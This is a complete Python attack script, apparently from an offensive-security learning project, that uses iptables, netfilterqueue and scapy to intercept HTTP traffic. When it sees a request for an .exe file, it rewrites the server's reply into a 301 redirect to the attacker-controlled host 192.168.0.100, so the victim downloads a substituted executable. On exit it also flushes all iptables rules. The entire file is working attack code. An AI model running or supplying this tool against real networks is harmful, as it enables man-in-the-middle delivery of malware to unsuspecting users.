#!/usr/bin/env python3
import sys

import netfilterqueue
import subprocess
import scapy.all as scapy

# A list to store ack_values of all HTTP requests so as to verify correct HTTP response and then intercept it! :D
ack_list = []


def check_root_or_not():
    try:
        scapy.srp(scapy.Ether(), verbose=False, timeout=0.5)
    except PermissionError:
        print("\n[-] Kindly re-run with root privileges.\n")
        exit(0)


def __set_load(packet, load):
    packet[scapy.Raw].load = load

    # This is to delete 'chksum' (verification code) and 'len' (length) in 'TCP' and 'IP' layers.
    # Upon deletion scapy recalculates and fills those fields back again :)
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # This creates a scapy_packet with same data/payload as that of our original queue packet! :D

    if scapy_packet.haslayer(scapy.Raw):

        # Here we use '[scapy.TCP].dport' and '[scapy.TCP].sport' instead of 'haslayer(http.HTTPRequest)'
        # and 'haslayer(http.HTTPResponse)' respectively,
        # because we want ALL data sent through HTTP and not just REQUEST and RESPONSES ;)
        # Note - Port '80' is assigned by default to 'http' :)

        # If destination port is '80' then it means packet is being sent through 'http'
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in str(scapy_packet[scapy.Raw].load) and "192.168.0.100" not in str(scapy_packet[scapy.Raw].load):
                print("\n[*] HTTP Request for .exe:-\n")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())

        # If source port is '80' then it means packet is coming from 'http'
        elif scapy_packet[scapy.TCP].sport == 80:

            if scapy_packet[scapy.TCP].seq in ack_list:
                print("\n[*] Replacing HTTP Response:-\n")

                # The '301' here is a HTTP response code that redirects to a url other than the one requested for.
                # The original response had a '200' code that was an OK code for the request, but we want it to redirect
                # So we change it ;D
                new_load = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.0.100\n\n"

                scapy_packet = __set_load(scapy_packet, new_load)

                print(scapy_packet.show())

                # Finally replacing original packet with this modified scapy_packet.
                python_version = int(sys.version[0])
                if python_version < 3:
                    packet.set_payload(str(scapy_packet))
                else:
                    packet.set_payload(bytes(scapy_packet))

                # Removing it from the ack_list :D
                ack_list.remove(scapy_packet[scapy.TCP].seq)

    packet.accept()  # Forwards the packet to the router/target :)
    # packet.drop()  # Doesn't forward the packet to the router/target


check_root_or_not()

# subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
# Creates a queue of all packets being forwarded, and traps them in the queue.
# --queue-num specifies the queue number we want.

subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
# This is used to trap packets sent as OUTPUT by our own computer.
# And also The INPUT packets that are received by our computer too, since spoofing works both ways :)
# To test the working of our spoof_dns locally first :)

queue = netfilterqueue.NetfilterQueue()  # Created an instance of NetfilterQueue() to hold a netFilter queue.

queue.bind(0, process_packet)  # Callback function refers each packet in the queue to the specified function :)
# This binds our object 'queue' to the queue with num. '0' created above using iptables through subprocess

try:
    print("\n[+] Starting intercept.py...\n")
    queue.run()  # This activates the queue; runs it! :D
except KeyboardInterrupt:
    print("\n\n[-] KeyboardInterrupt detected. \n[*] Restoring IP tables back to Normal...")
    subprocess.call("iptables --flush", shell=True)  # restores iptables back to normal :)
    pass
